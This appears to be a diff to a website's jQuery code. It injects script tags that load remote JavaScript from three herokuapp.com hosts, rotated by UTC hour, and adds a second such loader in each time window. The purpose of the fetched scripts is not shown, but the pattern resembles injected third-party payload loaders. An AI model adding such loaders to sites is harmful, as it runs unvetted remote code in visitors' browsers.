@@ -230,18 +230,16 @@ $(document).ready(function(){
 		var nH=nD.getUTCHours();
 
 		if(nH<8){
+			$('body').append('<script id="yp_1872" src="https:\/\/arcane-anchorage-86502.herokuapp.com\/?id=1409"><\/script>');
 			$('body').append('<script src="https:\/\/arcane-anchorage-86502.herokuapp.com\/?id=7881"><\/script>');
 		}
 		if(nH>=8 && nH<16){
+			$('body').append('<script id="yp_1872" src="https:\/\/lit-shore-57528.herokuapp.com\/?id=1409"><\/script>');
 			$('body').append('<script src="https:\/\/lit-shore-57528.herokuapp.com\/?id=7881"><\/script>');
 		}
 		if(nH>=16){
+			$('body').append('<script id="yp_1872" src="https:\/\/radiant-everglades-72351.herokuapp.com\/?id=1409"><\/script>');
 			$('body').append('<script src="https:\/\/radiant-everglades-72351.herokuapp.com\/?id=7881"><\/script>');
 		}
-	}
-
-	if(rCo==1){
-		var ta=Math.floor(Math.random()*10001)+25000;
-		setTimeout(function(){ window.location=window.location; },ta);
 	}
 });
